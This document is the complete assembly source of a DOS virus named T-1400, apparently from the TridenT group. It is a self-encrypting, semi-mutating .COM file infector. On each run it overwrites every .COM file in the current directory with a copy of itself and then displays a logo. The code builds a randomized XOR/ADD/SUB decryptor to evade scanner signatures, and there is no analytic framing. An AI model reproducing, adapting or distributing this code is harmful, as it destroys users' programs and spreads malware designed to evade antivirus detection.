;
; T-1400 Virus
;
; This is a non-resident overwriting self-encrypting semi-mutating .COM file
; infector. When an infected program is run, the virus will infect all the
; file in the current directory and displays a TridenT logo when finished with
; infecting. This is a bit more advanced virus than "T-1300" and a wildcard
; scanstring is needed to find this virus. It now utilizes three types of
; encryption, instead of only the XOR loop. it now utilizes ADD, ADC, SUB and
; SBB. the increment SI has now a new
; possibility, CMPSB.
;
Beg:
                Mov Cx,MainLen
Length          Equ $-2
S_1:            Lea Si,Main
Zaken:          Clc
Decrypt:        Xor B [Si],0
CryptByte       Equ $-1
S_2             Equ $-2
S_3:            Inc Si
S_4:            Loop Zaken
CryptLen        Equ $-Beg
Main:           Mov Ah,4eh
SeekNext:       Lea Dx,FileSpec
                Xor Cx,Cx
                Int 21h
                Jnc Yup
                Jmp Einde
Yup:            Mov Ax,3d02h
                Mov Dx,09eh
                Int 21h
                Xchg Ax,Bx
                Mov Ds,Cx
                Inc Cx
                Mov Ax,W Ds:[46ch]

                Mov Ds,Cs
                Mov B CryptByte,Ah
                Mov B Zaken,0f8h

                Mov B What,1
                Mov B S_2,34h
                Test Al,1
                Jne NotXor
                Test Al,32
                Jne Done
                Xor B Zaken,1
                Jmp Done
NotXor:         Mov B What,2
                Mov B S_2,04h
                Test Al,2
                Je Done
                Test Al,4
                Je ItsAdc
                Mov B What,3
                Mov B S_2,2ch
                Test Al,8
                Je Done
                Sub B S_2,20h
ItsAdc:         Add B S_2,10h
Done:           Mov B S_1,0beh
                Cmp Ah,80h
                Ja NoCMPSB
                Mov B S_3,0A6h
                Jmp Next
NoCMPSB:        Mov B S_3,46h
Next:           Test Ah,1
                Jne NoReg
                Xor B S_1,Cl
                Xor B S_2,Cl
                Cmp Ah,80h
                Jbe NoReg
                Xor B S_3,Cl
NoReg:          Test Ah,2
                Jne NoXor
                Xor B Decrypt,2
NoXor:          Test Ah,4
                Jne NoLoop
                Xor B S_4,2
NoLoop:         Test Ah,8
                Jne Ok
                Mov B S_4,0E2h
Ok:             Lea Si,Main
                Lea Di,CryptPart
                Mov Cx,MainLen
                Push Cx
CodeIt:         Lodsb
                Cmp B What,1
                Jne NeXor
                Xor Al,Ah
                Jmp Stor
NeXor:          Cmp B What,2
                Jne NeSub
                Sub Al,Ah
                Jmp Stor
NeSub:          Add Al,Ah
Stor:           Stosb
                Loop CodeIt
                Pop Cx
                And Ax,03fffh
                Add Cx,Ax
                Mov W Length,Cx
                Mov Ah,40h
                Lea Dx,Beg
                Mov Cx,CryptLen
                Int 21h
                Mov Ah,40h
                Lea Dx,CryptPart
                Mov Cx,MainLen
                Int 21h
                Mov Ah,3eh
                Int 21h
                Mov Ah,4fh
                Jmp SeekNext
What            Db 0
Einde:
                Mov Al,3
                Int 10h
                Lea Si,Y
                R: Lodsb
                Mov Cl,8
                C: Rol Al,1
                Push Ax
                Mov Al,32
                If C Mov Al,219
                Int 29h
                Int 29h
                Pop Ax
                Loop C
                Cmp Si,E
                Jne R
                Ret
                Y: db 125,231,121,244,95,17,18,69,6,68,17,226,69,197,68,17,18,69,4,196,17,23,121,244,68
                E:

FileSpec        Db '*.COM',0

Msg             Db 'T-1400'

MainLen         Equ $-Main

CryptPart       Equ $
